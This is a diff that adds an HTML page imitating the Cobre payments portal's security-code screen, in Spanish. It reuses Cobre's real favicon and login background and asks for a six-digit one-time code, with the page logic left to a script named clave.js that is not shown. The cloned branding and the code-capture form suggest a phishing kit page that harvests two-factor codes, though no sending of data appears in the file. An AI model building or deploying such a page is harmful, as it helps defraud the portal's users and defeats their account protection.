@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="es" translate="no">
+<head>
+  <meta charset="UTF-8" />
+  <title>Verificación de Seguridad | Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="shortcut icon" href="https://portal.cobre.co/assets/cobre-favicon-oI7-6HmT.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --primary-color: #266D6C;
+      --primary-hover: #1f5655;
+      --bg-color: #000000;
+      --card-bg: #ffffff;
+      --text-color: #212121;
+      --text-light: #575655;
+      --border-color: #A4A3A1;
+      --error-color: #BD2500;
+    }
+    
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background-color: var(--bg-color);
+      background-image: url('https://cobre-portal-static-assets-prod.s3.us-east-1.amazonaws.com/id-provider/login/background-full.jpg');
+      background-size: cover;
+      background-position: center;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    
+    .card {
+      background: var(--card-bg);
+      border-radius: 16px;
+      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.2);
+      width: 100%;
+      max-width: 440px;
+      padding: 40px;
+      position: relative;
+    }
+    
+    .close-btn {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      background: none;
+      border: none;
+      font-size: 24px;
+      cursor: pointer;
+      color: var(--text-light);
+    }
+    
+    .logo-container {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 24px;
+    }
+    
+    .logo {
+      height: 32px;
+    }
+    
+    .header {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    
+    .title {
+      font-size: 24px;
+      font-weight: 700;
+      color: var(--text-color);
+      margin-bottom: 8px;
+    }
+    
+    .description {
+      font-size: 14px;
+      color: var(--text-light);
+      line-height: 1.5;
+    }
+    
+    .slots {
+      display: flex;
+      justify-content: space-between;
+      gap: 8px;
+      margin-bottom: 30px;
+    }
+    
+    .slots input {
+      width: 48px;
+      height: 48px;
+      border: 1px solid var(--border-color);
+      border-radius: 6px;
+      text-align: center;
+      font-size: 20px;
+      font-weight: 600;
+      color: var(--text-color);
+      background: #ffffff;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    
+    .slots input:focus {
+      border-color: var(--primary-color);
+      box-shadow: 0 0 0 2px rgba(38, 109, 108, 0.15);
+    }
+    
+    .footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 16px;
+    }
+    
+    .btn {
+      padding: 12px 24px;
+      font-size: 14px;
+      font-weight: 600;
+      border-radius: 9999px;
+      cursor: pointer;
+      outline: none;
+      transition: all 0.2s;
+      flex: 1;
+    }
+    
+    .btn-secondary {
+      background: none;
+      border: 1px solid var(--border-color);
+      color: var(--text-light);
+    }
+    
+    .btn-secondary:hover {
+      background: #f5f5f5;
+      color: var(--text-color);
+    }
+    
+    .btn-primary {
+      background: var(--primary-color);
+      border: none;
+      color: #ffffff;
+    }
+    
+    .btn-primary:hover:not(:disabled) {
+      background: var(--primary-hover);
+    }
+    
+    .btn-primary:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+    
+    .loader {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 0;
+    }
+    
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #e0e0e0;
+      border-top: 5px solid var(--primary-color);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .loader p {
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--text-color);
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <button type="button" class="close-btn" id="otp-close" aria-label="Cerrar">&times;</button>
+    
+    <div id="otp-content">
+      <div class="logo-container">
+        <img class="logo" src="/index_files/cobre-complete-black-CLeuODTt.svg" alt="Cobre" />
+      </div>
+      
+      <div class="header">
+        <h3 class="title" id="otp-title">Código de Seguridad</h3>
+        <p class="description bc-key-validation-description">Cargando instrucciones...</p>
+      </div>
+      
+      <div class="slots" id="otp-slots">
+        <input inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Ingresar primer dígito" />
+        <input inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Ingresar segundo dígito" />
+        <input inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Ingresar tercer dígito" />
+        <input inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Ingresar cuarto dígito" />
+        <input inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Ingresar quinto dígito" />
+        <input inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Ingresar sexto dígito" />
+      </div>
+      
+      <div class="footer">
+        <button class="btn btn-secondary" type="button" id="otp-clear">Borrar</button>
+        <button class="btn btn-primary" type="button" id="otp-next" disabled>Continuar</button>
+      </div>
+    </div>
+    
+    <div class="loader" id="otp-validating" hidden>
+      <div class="spinner"></div>
+      <p>Validando código...</p>
+    </div>
+  </div>
+
+  <script src="js/clave.js"></script>
+</body>
+</html>
